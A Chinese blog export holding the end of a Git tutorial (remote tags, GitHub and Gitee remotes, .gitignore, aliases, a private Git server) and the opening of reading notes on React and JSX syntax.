<p>或者，一次性推送全部尚未推送到远程的本地标签：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git push origin --tags</span><br><span class="line">Total 0 (delta 0), reused 0 (delta 0)</span><br><span class="line">To github.com:michaelliao/learngit.git</span><br><span class="line"> * [new tag]         v0.9 -&gt; v0.9</span><br></pre></td></tr></table></figure></p>
<p>如果标签已经推送到远程，要删除远程标签就麻烦一点，先从本地删除：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git tag -d v0.9</span><br><span class="line">Deleted tag &apos;v0.9&apos; (was f52c633)</span><br></pre></td></tr></table></figure></p>
<p>然后，从远程删除。删除命令也是push，但是格式如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git push origin :refs/tags/v0.9</span><br><span class="line">To github.com:michaelliao/learngit.git</span><br><span class="line"> - [deleted]         v0.9</span><br></pre></td></tr></table></figure></p>
<p>要看看是否真的从远程库删除了标签，可以登陆GitHub查看。</p>
<h1 id="使用GitHub"><a href="#使用GitHub" class="headerlink" title="使用GitHub"></a>使用GitHub</h1><p>我们一直用GitHub作为免费的远程仓库，如果是个人的开源项目，放到GitHub上是完全没有问题的。其实GitHub还是一个开源协作社区，通过GitHub，既可以让别人参与你的开源项目，也可以参与别人的开源项目。</p>
<p>在GitHub出现以前，开源项目开源容易，但让广大人民群众参与进来比较困难，因为要参与，就要提交代码，而给每个想提交代码的群众都开一个账号那是不现实的，因此，群众也仅限于报个bug，即使能改掉bug，也只能把diff文件用邮件发过去，很不方便。</p>
<p>但是在GitHub上，利用Git极其强大的克隆和分支功能，广大人民群众真正可以第一次自由参与各种开源项目了。</p>
<p>如何参与一个开源项目呢？比如人气极高的bootstrap项目，这是一个非常强大的CSS框架，你可以访问它的项目主页<a href="https://github.com/twbs/bootstrap，点“Fork”就在自己的账号下克隆了一个bootstrap仓库，然后，从自己的账号下clone：" target="_blank" rel="noopener">https://github.com/twbs/bootstrap，点“Fork”就在自己的账号下克隆了一个bootstrap仓库，然后，从自己的账号下clone：</a><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone git@github.com:michaelliao/bootstrap.git</span><br></pre></td></tr></table></figure></p>
<p>一定要从自己的账号下clone仓库，这样你才能推送修改。如果从bootstrap的作者的仓库地址<a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>:twbs/bootstrap.git克隆，因为没有权限，你将不能推送修改。</p>
<p>Bootstrap的官方仓库twbs/bootstrap、你在GitHub上克隆的仓库my/bootstrap，以及你自己克隆到本地电脑的仓库，他们的关系就像下图显示的那样：<br><img src="https://mfaying.github.io/static/images/hbase/13.jpg" alt><br>如果你想修复bootstrap的一个bug，或者新增一个功能，立刻就可以开始干活，干完后，往自己的仓库推送。</p>
<p>如果你希望bootstrap的官方库能接受你的修改，你就可以在GitHub上发起一个pull request。当然，对方是否接受你的pull request就不一定了。</p>
<h2 id="使用码云"><a href="#使用码云" class="headerlink" title="使用码云"></a>使用码云</h2><p>使用GitHub时，国内的用户经常遇到的问题是访问速度太慢，有时候还会出现无法连接的情况</p>
<p>如果我们希望体验Git飞一般的速度，可以使用国内的Git托管服务——码云（gitee.com）。</p>
<p>和GitHub相比，码云也提供免费的Git仓库。此外，还集成了代码质量检测、项目演示等功能。对于团队协作开发，码云还提供了项目管理、代码托管、文档管理的服务，5人以下小团队免费。</p>
<p>码云的免费版本也提供私有库功能，只是有5人的成员上限。</p>
<p>使用码云和使用GitHub类似，我们在码云上注册账号并登录后，需要先上传自己的SSH公钥。选择右上角用户头像 -&gt; 菜单“修改资料”，然后选择“SSH公钥”，填写一个便于识别的标题，然后把用户主目录下的.ssh/id_rsa.pub文件的内容粘贴进去</p>
<p>如果我们已经有了一个本地的git仓库（例如，一个名为learngit的本地库），如何把它关联到码云的远程库上呢？</p>
<p>首先，我们在码云上创建一个新的项目，选择右上角用户头像 -&gt; 菜单“控制面板”，然后点击“创建项目”</p>
<p>项目名称最好与本地库保持一致：</p>
<p>然后，我们在本地库上使用命令git remote add把它和码云的远程库关联：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git remote add origin git@gitee.com:liaoxuefeng/learngit.git</span><br></pre></td></tr></table></figure></p>
<p>之后，就可以正常地用git push和git pull推送了！</p>
<p>如果在使用命令git remote add时报错：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git remote add origin git@gitee.com:liaoxuefeng/learngit.git</span><br><span class="line">fatal: remote origin already exists.</span><br></pre></td></tr></table></figure></p>
<p>这说明本地库已经关联了一个名叫origin的远程库，此时，可以先用git remote -v查看远程库信息：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git remote -v</span><br><span class="line">origin	git@github.com:michaelliao/learngit.git (fetch)</span><br><span class="line">origin	git@github.com:michaelliao/learngit.git (push)</span><br></pre></td></tr></table></figure></p>
<p>可以看到，本地库已经关联了origin的远程库，并且，该远程库指向GitHub。</p>
<p>我们可以删除已有的GitHub远程库：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git remote rm origin</span><br></pre></td></tr></table></figure></p>
<p>再关联码云的远程库（注意路径中需要填写正确的用户名）：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git remote add origin git@gitee.com:liaoxuefeng/learngit.git</span><br></pre></td></tr></table></figure></p>
<p>此时，我们再查看远程库信息：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git remote -v</span><br><span class="line">origin	git@gitee.com:liaoxuefeng/learngit.git (fetch)</span><br><span class="line">origin	git@gitee.com:liaoxuefeng/learngit.git (push)</span><br></pre></td></tr></table></figure></p>
<p>现在可以看到，origin已经被关联到码云的远程库了。通过git push命令就可以把本地库推送到Gitee上。</p>
<p>有的小伙伴又要问了，一个本地库能不能既关联GitHub，又关联码云呢？</p>
<p>答案是肯定的，因为git本身是分布式版本控制系统，可以同步到另外一个远程库，当然也可以同步到另外两个远程库。</p>
<p>使用多个远程库时，我们要注意，git给远程库起的默认名称是origin，如果有多个远程库，我们需要用不同的名称来标识不同的远程库。</p>
<p>仍然以learngit本地库为例，我们先删除已关联的名为origin的远程库：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git remote rm origin</span><br></pre></td></tr></table></figure></p>
<p>然后，先关联GitHub的远程库：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git remote add github git@github.com:michaelliao/learngit.git</span><br></pre></td></tr></table></figure></p>
<p>注意，远程库的名称叫github，不叫origin了。</p>
<p>接着，再关联码云的远程库：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git remote add gitee git@gitee.com:liaoxuefeng/learngit.git</span><br></pre></td></tr></table></figure></p>
<p>同样注意，远程库的名称叫gitee，不叫origin。</p>
<p>现在，我们用git remote -v查看远程库信息，可以看到两个远程库：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git remote -v</span><br><span class="line">gitee	git@gitee.com:liaoxuefeng/learngit.git (fetch)</span><br><span class="line">gitee	git@gitee.com:liaoxuefeng/learngit.git (push)</span><br><span class="line">github	git@github.com:michaelliao/learngit.git (fetch)</span><br><span class="line">github	git@github.com:michaelliao/learngit.git (push)</span><br></pre></td></tr></table></figure></p>
<p>如果要推送到GitHub，使用命令：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git push github master</span><br></pre></td></tr></table></figure></p>
<p>如果要推送到码云，使用命令：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git push gitee master</span><br></pre></td></tr></table></figure></p>
<p>这样一来，我们的本地库就可以同时与多个远程库互相同步</p>
<p>码云也同样提供了Pull request功能，可以让其他小伙伴参与到开源项目中来。你可以通过Fork我的仓库：<a href="https://gitee.com/liaoxuefeng/learngit，创建一个your-gitee-id.txt的文本文件，" target="_blank" rel="noopener">https://gitee.com/liaoxuefeng/learngit，创建一个your-gitee-id.txt的文本文件，</a> 写点自己学习Git的心得，然后推送一个pull request给我，这个仓库会在码云和GitHub做双向同步。</p>
<h2 id="自定义Git"><a href="#自定义Git" class="headerlink" title="自定义Git"></a>自定义Git</h2><p>在安装Git一节中，我们已经配置了user.name和user.email，实际上，Git还有很多可配置项。</p>
<p>比如，让Git显示颜色，会让命令输出看起来更醒目：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git config --global color.ui true</span><br></pre></td></tr></table></figure></p>
<p>这样，Git会适当地显示不同的颜色，比如git status命令</p>
<p>文件名就会标上颜色。</p>
<p>我们在后面还会介绍如何更好地配置Git，以便让你的工作更高效。</p>
<h2 id="忽略特殊文件"><a href="#忽略特殊文件" class="headerlink" title="忽略特殊文件"></a>忽略特殊文件</h2><p>有些时候，你必须把某些文件放到Git工作目录中，但又不能提交它们，比如保存了数据库密码的配置文件啦，等等，每次git status都会显示Untracked files …，有强迫症的童鞋心里肯定不爽。</p>
<p>好在Git考虑到了大家的感受，这个问题解决起来也很简单，在Git工作区的根目录下创建一个特殊的.gitignore文件，然后把要忽略的文件名填进去，Git就会自动忽略这些文件。</p>
<p>不需要从头写.gitignore文件，GitHub已经为我们准备了各种配置文件，只需要组合一下就可以使用了。所有配置文件可以直接在线浏览：<a href="https://github.com/github/gitignore" target="_blank" rel="noopener">https://github.com/github/gitignore</a></p>
<p>忽略文件的原则是：</p>
<ol>
<li>忽略操作系统自动生成的文件，比如缩略图等；</li>
<li>忽略编译生成的中间文件、可执行文件等，也就是如果一个文件是通过另一个文件自动生成的，那自动生成的文件就没必要放进版本库，比如Java编译产生的.class文件；</li>
<li>忽略你自己的带有敏感信息的配置文件，比如存放口令的配置文件。</li>
</ol>
<p>举个例子：</p>
<p>假设你在Windows下进行Python开发，Windows会自动在有图片的目录下生成隐藏的缩略图文件，如果有自定义目录，目录下就会有Desktop.ini文件，因此你需要忽略Windows自动生成的垃圾文件：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Windows:</span><br><span class="line">Thumbs.db</span><br><span class="line">ehthumbs.db</span><br><span class="line">Desktop.ini</span><br></pre></td></tr></table></figure></p>
<p>然后，继续忽略Python编译产生的.pyc、.pyo、dist等文件或目录：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Python:</span><br><span class="line">*.py[cod]</span><br><span class="line">*.so</span><br><span class="line">*.egg</span><br><span class="line">*.egg-info</span><br><span class="line">dist</span><br><span class="line">build</span><br></pre></td></tr></table></figure></p>
<p>加上你自己定义的文件，最终得到一个完整的.gitignore文件，内容如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Windows:</span><br><span class="line">Thumbs.db</span><br><span class="line">ehthumbs.db</span><br><span class="line">Desktop.ini</span><br><span class="line"></span><br><span class="line"># Python:</span><br><span class="line">*.py[cod]</span><br><span class="line">*.so</span><br><span class="line">*.egg</span><br><span class="line">*.egg-info</span><br><span class="line">dist</span><br><span class="line">build</span><br><span class="line"></span><br><span class="line"># My configurations:</span><br><span class="line">db.ini</span><br><span class="line">deploy_key_rsa</span><br></pre></td></tr></table></figure></p>
<p>最后一步就是把.gitignore也提交到Git，就完成了！当然检验.gitignore的标准是git status命令是不是说working directory clean。</p>
<p>使用Windows的童鞋注意了，如果你在资源管理器里新建一个.gitignore文件，它会非常弱智地提示你必须输入文件名，但是在文本编辑器里“保存”或者“另存为”就可以把文件保存为.gitignore了。</p>
<p>有些时候，你想添加一个文件到Git，但发现添加不了，原因是这个文件被.gitignore忽略了：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git add App.class</span><br><span class="line">The following paths are ignored by one of your .gitignore files:</span><br><span class="line">App.class</span><br><span class="line">Use -f if you really want to add them.</span><br></pre></td></tr></table></figure></p>
<p>如果你确实想添加该文件，可以用-f强制添加到Git：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git add -f App.class</span><br></pre></td></tr></table></figure></p>
<p>或者你发现，可能是.gitignore写得有问题，需要找出来到底哪个规则写错了，可以用git check-ignore命令检查：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git check-ignore -v App.class</span><br><span class="line">.gitignore:3:*.class	App.class</span><br></pre></td></tr></table></figure></p>
<p>Git会告诉我们，.gitignore的第3行规则忽略了该文件，于是我们就可以知道应该修订哪个规则。</p>
<h2 id="配置别名"><a href="#配置别名" class="headerlink" title="配置别名"></a>配置别名</h2><p>有没有经常敲错命令？比如git status？status这个单词真心不好记。</p>
<p>如果敲git st就表示git status那就简单多了，当然这种偷懒的办法我们是极力赞成的。</p>
<p>我们只需要敲一行命令，告诉Git，以后st就表示status：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git config --global alias.st status</span><br></pre></td></tr></table></figure></p>
<p>好了，现在敲git st看看效果。</p>
<p>当然还有别的命令可以简写，很多人都用co表示checkout，ci表示commit，br表示branch：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git config --global alias.co checkout</span><br><span class="line">$ git config --global alias.ci commit</span><br><span class="line">$ git config --global alias.br branch</span><br></pre></td></tr></table></figure></p>
<p>以后提交就可以简写成：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git ci -m &quot;bala bala bala...&quot;</span><br></pre></td></tr></table></figure></p>
<p>–global参数是全局参数，也就是这些命令在这台电脑的所有Git仓库下都有用。</p>
<p>在撤销修改一节中，我们知道，命令git reset HEAD file可以把暂存区的修改撤销掉（unstage），重新放回工作区。既然是一个unstage操作，就可以配置一个unstage别名：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git config --global alias.unstage &apos;reset HEAD&apos;</span><br></pre></td></tr></table></figure></p>
<p>当你敲入命令：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git unstage test.py</span><br></pre></td></tr></table></figure></p>
<p>实际上Git执行的是：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git reset HEAD test.py</span><br></pre></td></tr></table></figure></p>
<p>配置一个git last，让其显示最后一次提交信息：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git config --global alias.last &apos;log -1&apos;</span><br></pre></td></tr></table></figure></p>
<p>这样，用git last就能显示最近一次的提交：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git last</span><br><span class="line">commit adca45d317e6d8a4b23f9811c3d7b7f0f180bfe2</span><br><span class="line">Merge: bd6ae48 291bea8</span><br><span class="line">Author: Michael Liao &lt;askxuefeng@gmail.com&gt;</span><br><span class="line">Date:   Thu Aug 22 22:49:22 2013 +0800</span><br><span class="line"></span><br><span class="line">    merge &amp; fix hello.py</span><br></pre></td></tr></table></figure></p>
<p>甚至还有人丧心病狂地把lg配置成了：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git config --global alias.lg &quot;log --color --graph --pretty=format:&apos;%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)&lt;%an&gt;%Creset&apos; --abbrev-commit&quot;</span><br></pre></td></tr></table></figure></p>
<p>配置文件</p>
<p>配置Git的时候，加上–global是针对当前用户起作用的，如果不加，那只针对当前的仓库起作用。</p>
<p>配置文件放哪了？每个仓库的Git配置文件都放在.git/config文件中：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat .git/config </span><br><span class="line">[core]</span><br><span class="line">    repositoryformatversion = 0</span><br><span class="line">    filemode = true</span><br><span class="line">    bare = false</span><br><span class="line">    logallrefupdates = true</span><br><span class="line">    ignorecase = true</span><br><span class="line">    precomposeunicode = true</span><br><span class="line">[remote &quot;origin&quot;]</span><br><span class="line">    url = git@github.com:michaelliao/learngit.git</span><br><span class="line">    fetch = +refs/heads/*:refs/remotes/origin/*</span><br><span class="line">[branch &quot;master&quot;]</span><br><span class="line">    remote = origin</span><br><span class="line">    merge = refs/heads/master</span><br><span class="line">[alias]</span><br><span class="line">    last = log -1</span><br></pre></td></tr></table></figure></p>
<p>别名就在[alias]后面，要删除别名，直接把对应的行删掉即可。</p>
<p>而当前用户的Git配置文件放在用户主目录下的一个隐藏文件.gitconfig中：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat .gitconfig</span><br><span class="line">[alias]</span><br><span class="line">    co = checkout</span><br><span class="line">    ci = commit</span><br><span class="line">    br = branch</span><br><span class="line">    st = status</span><br><span class="line">[user]</span><br><span class="line">    name = Your Name</span><br><span class="line">    email = your@email.com</span><br></pre></td></tr></table></figure></p>
<p>配置别名也可以直接修改这个文件，如果改错了，可以删掉文件重新通过命令配置。</p>
<h2 id="搭建Git服务器"><a href="#搭建Git服务器" class="headerlink" title="搭建Git服务器"></a>搭建Git服务器</h2><p>在远程仓库一节中，我们讲了远程仓库实际上和本地仓库没啥不同，纯粹为了7x24小时开机并交换大家的修改。</p>
<p>GitHub就是一个免费托管开源代码的远程仓库。但是对于某些视源代码如生命的商业公司来说，既不想公开源代码，又舍不得给GitHub交保护费，那就只能自己搭建一台Git服务器作为私有仓库使用。</p>
<p>搭建Git服务器需要准备一台运行Linux的机器，强烈推荐用Ubuntu或Debian，这样，通过几条简单的apt命令就可以完成安装。</p>
<p>假设你已经有sudo权限的用户账号，下面，正式开始安装。</p>
<p>第一步，安装git：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get install git</span><br></pre></td></tr></table></figure></p>
<p>第二步，创建一个git用户，用来运行git服务：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo adduser git</span><br></pre></td></tr></table></figure></p>
<p>第三步，创建证书登录：</p>
<p>收集所有需要登录的用户的公钥，就是他们自己的id_rsa.pub文件，把所有公钥导入到/home/git/.ssh/authorized_keys文件里，一行一个。</p>
<p>第四步，初始化Git仓库：</p>
<p>先选定一个目录作为Git仓库，假定是/srv/sample.git，在/srv目录下输入命令：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo git init --bare sample.git</span><br></pre></td></tr></table></figure></p>
<p>Git就会创建一个裸仓库，裸仓库没有工作区，因为服务器上的Git仓库纯粹是为了共享，所以不让用户直接登录到服务器上去改工作区，并且服务器上的Git仓库通常都以.git结尾。然后，把owner改为git：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo chown -R git:git sample.git</span><br></pre></td></tr></table></figure></p>
<p>第五步，禁用shell登录：</p>
<p>出于安全考虑，第二步创建的git用户不允许登录shell，这可以通过编辑/etc/passwd文件完成。找到类似下面的一行：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git:x:1001:1001:,,,:/home/git:/bin/bash</span><br></pre></td></tr></table></figure></p>
<p>改为：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git:x:1001:1001:,,,:/home/git:/usr/bin/git-shell</span><br></pre></td></tr></table></figure></p>
<p>这样，git用户可以正常通过ssh使用git，但无法登录shell，因为我们为git用户指定的git-shell每次一登录就自动退出。</p>
<p>第六步，克隆远程仓库：</p>
<p>现在，可以通过git clone命令克隆远程仓库了，在各自的电脑上运行：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git clone git@server:/srv/sample.git</span><br><span class="line">Cloning into &apos;sample&apos;...</span><br><span class="line">warning: You appear to have cloned an empty repository.</span><br></pre></td></tr></table></figure></p>
<p>剩下的推送就简单了。</p>
<h2 id="管理公钥"><a href="#管理公钥" class="headerlink" title="管理公钥"></a>管理公钥</h2><p>如果团队很小，把每个人的公钥收集起来放到服务器的/home/git/.ssh/authorized_keys文件里就是可行的。如果团队有几百号人，就没法这么玩了，这时，可以用Gitosis来管理公钥。</p>
<p>这里我们不介绍怎么玩Gitosis了，几百号人的团队基本都在500强了，相信找个高水平的Linux管理员问题不大。</p>
<h2 id="管理权限"><a href="#管理权限" class="headerlink" title="管理权限"></a>管理权限</h2><p>有很多不但视源代码如生命，而且视员工为窃贼的公司，会在版本控制系统里设置一套完善的权限控制，每个人是否有读写权限会精确到每个分支甚至每个目录下。因为Git是为Linux源代码托管而开发的，所以Git也继承了开源社区的精神，不支持权限控制。不过，因为Git支持钩子（hook），所以，可以在服务器端编写一系列脚本来控制提交等操作，达到权限控制的目的。Gitolite就是这个工具,这里我们不展开介绍了。</p>
<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>Git虽然极其强大，命令繁多，但常用的就那么十来个，掌握好这十几个常用命令，你已经可以得心应手地使用Git了。</p>
<p>友情附赠国外网友制作的Git Cheat Sheet：<br><a href="https://gitee.com/liaoxuefeng/learn-java/raw/master/teach/git-cheatsheet.pdf" target="_blank" rel="noopener">Git Cheat Sheet</a></p>
<p>以及<a href="http://git-scm.com" target="_blank" rel="noopener">Git的官方网站</a></p>
]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>《深入React技术栈》</title>
    <url>/2019/11/10/%E3%80%8A%E6%B7%B1%E5%85%A5React%E6%8A%80%E6%9C%AF%E6%A0%88%E3%80%8B/</url>
    <content><![CDATA[<p>react 全系列</p>
<a id="more"></a>
<h1 id="React-简介"><a href="#React-简介" class="headerlink" title="React 简介"></a>React 简介</h1><p>React 是 Facebook 在 2013 年开源 JavaScript 库。它把界面抽象成一个个组件，通过组合这些组件，开发者可以得到功能丰富的页面。同时引入了 JSX 语法，使得复用组件变得容易，且结构清晰。并且有了组件这层的抽象，代码和真实渲染目标分离，除了可以在浏览器端渲染到 DOM 开发网页外，还能用于原生移动应用的开发。</p>
<h2 id="专注视图层"><a href="#专注视图层" class="headerlink" title="专注视图层"></a>专注视图层</h2><p>React 并不是完整的 MVC/MVVM 框架，它专注于 View（视图）层解决方案。与模板引擎不同，React 又是一个包括 View 和 Controller 的库。</p>
<h2 id="Virtual-DOM"><a href="#Virtual-DOM" class="headerlink" title="Virtual DOM"></a>Virtual DOM</h2><p>React 把真实 DOM 树转换成 JavaScript 对象树，也就是 Virtual DOM。每次数据更新，对比前后的 Virtual DOM，对发生变化的部分做批量更新，提升性能。并且 Virtual DOM 可以方便地与其他平台集成，比如 react-native 就是基于 Virtual DOM 渲染原生控件的。</p>
<h2 id="函数式编程"><a href="#函数式编程" class="headerlink" title="函数式编程"></a>函数式编程</h2><p>命令式编程是给计算机下命名，而函数式编程，对应的是声明式编程。声明式编程的本质是 lambda 演算，比如我们要操作一个数组里的每个元素，返回一个新数组。我们的做法是构建一个 f 函数(规则)作用在数组上，然后返回新数组。这样，计算可以被重复利用。</p>
<h1 id="JSX-语法"><a href="#JSX-语法" class="headerlink" title="JSX 语法"></a>JSX 语法</h1><p>JSX 是 react 为了方便 View 层组件化，承载构建 HTML 结构化页面职责的而创立的语言（语法）。</p>
<h2 id="DOM-元素和组件元素"><a href="#DOM-元素和组件元素" class="headerlink" title="DOM 元素和组件元素"></a>DOM 元素和组件元素</h2><p>在 react 中创建的虚拟元素可以分为两类，DOM 元素(DOM element)与组件元素(component element)。分别对应着原生 DOM 元素和自定义元素。</p>
<h2 id="DOM-元素"><a href="#DOM-元素" class="headerlink" title="DOM 元素"></a>DOM 元素</h2><p>当使用 JavaScript 来描述 Web 页面的 HTML 元素时，可以表示为纯粹的 JSON 对象。例如，描述一个按钮</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-blue"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">em</span>&gt;</span>Confirm<span class="tag">&lt;/<span class="name">em</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>-&gt;</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  type: &apos;button&apos;,</span><br><span class="line">  props: &#123;</span><br><span class="line">    className: &apos;btn btn-blue&apos;,</span><br><span class="line">    children: [&#123;</span><br><span class="line">      type: &apos;em&apos;,</span><br><span class="line">      props: &#123;</span><br><span class="line">        children: &apos;Confirm&apos;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在 react 中，到处可见的元素并不是真实的实例，它们只是页面的描述对象。</p>
<h2 id="组件元素"><a href="#组件元素" class="headerlink" title="组件元素"></a>组件元素</h2><p>React 还可以自定义组件元素。<br>类比如下</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> Button = <span class="function">(<span class="params">&#123; color, text &#125;</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    type: <span class="string">"button"</span>,</span><br><span class="line">    props: &#123;</span><br><span class="line">      className: <span class="string">`btn btn-<span class="subst">$&#123;color&#125;</span>`</span>,</span><br><span class="line">      children: [</span><br><span class="line">        &#123;</span><br><span class="line">          type: <span class="string">"em"</span>,</span><br><span class="line">          props: &#123;</span><br><span class="line">            children: text</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>Button 其实也可以作为元素而存在，方法名对应了元素类型，参数对应了元素属性。<br>这也是 React 的核心思想之一，我们可以让 DOM 元素、组件元素嵌套、组合，最后用递归渲染的方式构建出完全的 DOM 元素树。<br>但是这种写法不容易阅读和维护了，JSX 语法就应运而生了。</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> Button = <span class="function">(<span class="params">&#123; color, text &#125;</span>) =&gt;</span> &#123;</span><br><span class="line">  &lt;button className=&#123;<span class="string">`btn btn-<span class="subst">$&#123;color&#125;</span>`</span>&#125;&gt;</span><br><span class="line">    &lt;em&gt;&#123;text&#125;&lt;<span class="regexp">/em&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>button&gt;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>JSX 将 HTML 语法直接加入到 JavaScript 代码中，再通过翻译器转换成纯 JavaScript 后再由浏览器执行。</p>
<h2 id="JSX-基本语法"><a href="#JSX-基本语法" class="headerlink" title="JSX 基本语法"></a>JSX 基本语法</h2><p>JSX 的官方定义是类 XML 语法的 ECMAScript 扩展。</p>
<h2 id="XML-基本语法"><a href="#XML-基本语法" class="headerlink" title="XML 基本语法"></a>XML 基本语法</h2><p>使用类 XML 语法，我们可以清晰地看到 DOM 树状结果及其属性。只不过它被包裹在 JavaScript 的方法中</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> List = <span class="function"><span class="params">()</span> =&gt;</span> (</span><br><span class="line">  &lt;ul&gt;</span><br><span class="line">    &lt;li&gt;<span class="number">1</span>&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">    &lt;li&gt;2&lt;/</span>li&gt;</span><br><span class="line">  &lt;<span class="regexp">/ul&gt;</span></span><br><span class="line"><span class="regexp">);</span></span><br></pre></td></tr></table></figure>
<p>需要注意几点</p>
<ol>
<li>定义标签时，只允许被一个标签包裹。<br>如</li>
</ol>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> c = <span class="function"><span class="params">()</span> =&gt;</span> (<span class="xml"><span class="tag">&lt;<span class="name">span</span>&gt;</span>1<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><span class="xml"><span class="tag">&lt;<span class="name">span</span>&gt;</span>2<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span>);</span><br></pre></td></tr></table></figure>
<p>会报错，最外层没有包裹，显然无法转译成 React.createElement 方法调用</p>
<ol start="2">
<li>标签必须闭合，如<code>&lt;div&gt;&lt;/div&gt;</code>、<code>&lt;div /&gt;</code></li>
</ol>
<h2 id="元素类型"><a href="#元素类型" class="headerlink" title="元素类型"></a>元素类型</h2><p>小写字母对应 DOM 元素，大写字母对应组件元素<br>此外，还有一些特殊的标签值得讨论，比如注释和 DOCTYPE 头<br>JSX 还是 JavsScript，依然可以用简单的方法使用注释，在子元素位置使用注释要用{}包起来。<br>对于常用于判断浏览器版本的条件注释</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--[if IE]&gt;</span><br><span class="line">  &lt;p&gt;work in IE&lt;/p&gt;</span><br><span class="line">&lt;![endif]--&gt;</span><br></pre></td></tr></table></figure>
<p>需要用 JavaScript 判断来实现</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  (!!window.ActiveXObject || &apos;ActiveXObject&apos; in window) ?</span><br><span class="line">  &lt;p&gt;work in IE&lt;/p&gt; : &apos;&apos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>DOCTYPE 头是一个非常特殊的标志，一般会在 React 服务端渲染时用到。DOCTYPE 是没有闭合的，我们无法渲染它。常见的做法是构造一个保存 HTML 的变量，将 DOCTYPE 和整个 HTML 标签渲染后的结果串联起来。</p>
<h2 id="元素属性"><a href="#元素属性" class="headerlink" title="元素属性"></a>元素属性</h2><p>DOM 元素属性是标准规范属性，但 class 和 for 由于是关键字，由 className 和 htmlFor 替代。<br>组件元素属性是完全自定义的属性，也可以理解为实现组件所需要的参数。一般采用小驼峰写法。<br>此外还有一些特有的属性表达</p>
<ol>
<li>省略 Boolean 属性值会导致 JSX 认为 bool 值设为了 true</li>
</ol>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">&lt;Checkbox checked=&#123;<span class="literal">true</span>&#125; /&gt;</span><br></pre></td></tr></table></figure>
<p>可以简写成</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">&lt;Checkbox checked /&gt;</span><br></pre></td></tr></table></figure>
